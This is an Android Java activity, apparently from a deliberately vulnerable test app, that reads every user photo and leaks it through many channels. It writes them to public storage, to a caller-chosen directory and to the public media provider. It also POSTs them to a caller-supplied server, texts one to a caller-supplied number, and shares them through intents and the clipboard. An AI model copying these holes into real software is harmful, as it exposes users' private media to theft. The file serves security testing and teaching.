package oversecured.ovaa.vulns;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.telephony.SmsManager;

import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

public class MediaTheftActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String directory = getIntent().getStringExtra("directory");
        String server = getIntent().getStringExtra("server");
        String phone = getIntent().getStringExtra("phone");

        ArrayList<Uri> media = collectUserMedia();
        copyToExternalStorage(media);
        copyToControlledDirectory(media, directory);
        copyToPublicMediaProvider(media);
        uploadMedia(media, server);
        sendMediaViaSms(media, phone);
        shareMediaViaImplicitIntent(media);
        copyMediaToClipboard(media);
        returnMediaAsResult(media);
        finish();
    }

    private ArrayList<Uri> collectUserMedia() {
        ArrayList<Uri> uris = new ArrayList<>();
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[] {MediaStore.Images.Media._ID}, null, null, null);
        if (cursor == null) {
            return uris;
        }
        while (cursor.moveToNext()) {
            uris.add(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    cursor.getString(0)));
        }
        cursor.close();
        return uris;
    }

    private byte[] read(Uri uri) {
        try (InputStream in = getContentResolver().openInputStream(uri)) {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            IOUtils.copy(in, out);
            return out.toByteArray();
        } catch (IOException e) {
            return new byte[0];
        }
    }

    private void copyToExternalStorage(ArrayList<Uri> media) {
        for (Uri uri : media) {
            File destination = new File(Environment.getExternalStorageDirectory(),
                    "backup_" + uri.getLastPathSegment());
            try (OutputStream out = new FileOutputStream(destination)) {
                out.write(read(uri));
            } catch (IOException ignored) {
            }
        }
    }

    private void copyToControlledDirectory(ArrayList<Uri> media, String directory) {
        if (directory == null) {
            return;
        }
        for (Uri uri : media) {
            try (OutputStream out = new FileOutputStream(new File(directory, uri.getLastPathSegment()))) {
                out.write(read(uri));
            } catch (IOException ignored) {
            }
        }
    }

    private void copyToPublicMediaProvider(ArrayList<Uri> media) {
        for (Uri uri : media) {
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.DISPLAY_NAME, uri.getLastPathSegment());
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            Uri published = getContentResolver().insert(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
            if (published == null) {
                continue;
            }
            try (OutputStream out = getContentResolver().openOutputStream(published)) {
                out.write(read(uri));
            } catch (IOException ignored) {
            }
        }
    }

    private void uploadMedia(ArrayList<Uri> media, String server) {
        if (server == null) {
            return;
        }
        for (Uri uri : media) {
            try {
                HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                try (OutputStream out = connection.getOutputStream()) {
                    out.write(read(uri));
                }
                connection.getResponseCode();
            } catch (IOException ignored) {
            }
        }
    }

    private void sendMediaViaSms(ArrayList<Uri> media, String phone) {
        if (phone == null || media.isEmpty()) {
            return;
        }
        SmsManager.getDefault().sendDataMessage(phone, null, (short) 0, read(media.get(0)), null, null);
    }

    private void shareMediaViaImplicitIntent(ArrayList<Uri> media) {
        if (media.isEmpty()) {
            return;
        }
        Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
        intent.setType("image/*");
        intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, media);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
    }

    private void copyMediaToClipboard(ArrayList<Uri> media) {
        if (media.isEmpty()) {
            return;
        }
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboard.setPrimaryClip(ClipData.newUri(getContentResolver(), "photo", media.get(0)));
    }

    private void returnMediaAsResult(ArrayList<Uri> media) {
        Intent result = new Intent();
        result.putParcelableArrayListExtra("media", media);
        result.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        setResult(RESULT_OK, result);
    }
}
